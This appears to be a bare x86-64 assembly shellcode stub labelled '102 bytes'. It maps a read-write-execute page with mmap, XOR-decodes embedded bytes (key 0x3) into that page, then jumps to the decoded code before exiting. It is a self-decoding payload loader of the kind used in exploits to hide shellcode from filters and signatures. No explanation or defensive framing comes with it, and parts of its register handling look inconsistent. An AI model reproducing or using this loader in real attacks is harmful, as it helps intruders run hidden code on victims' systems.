# 102 bytes
jmp start

inject: 
    pop %rdi
    pop %rcx
    pop %rax

    xor %rsi, %rsi
    push %rsi
    pop %rdi    

inject_loop:
    cmpb $0x20, (%rax, %rsi, 1)
    je inject_finished
    movb (%rax, %rsi, 1), %r10b
    xor $0x3, %r10b
    movb %r10b, (%rcx, %rsi, 1)
    inc %rsi
    jmp inject_loop

inject_finished:
    inc %rsi 
    movb $0xc3, (%rcx, %rsi, 1)
    push %rdi
    push %rcx
    ret

getpc:
    mov (%rsp),%rbx
    ret

start:
    call getpc
    add $0x31,%rbx

    push $0x9
    pop %rax
    xor %rdi, %rdi
    push %rdi
    pop %rsi
    inc %rsi
    shl $0x12, %rsi
    push $0x7
    pop %rdx
    push $0x22
    pop %r10
    push %rdi
    push %rdi
    pop %r8
    pop %r9

    syscall   # The syscall for the mmap().

    push %rax
    push %rbx
    call inject

exit:
    push $60
    pop %rax
    xor %rdi, %rdi
    syscall

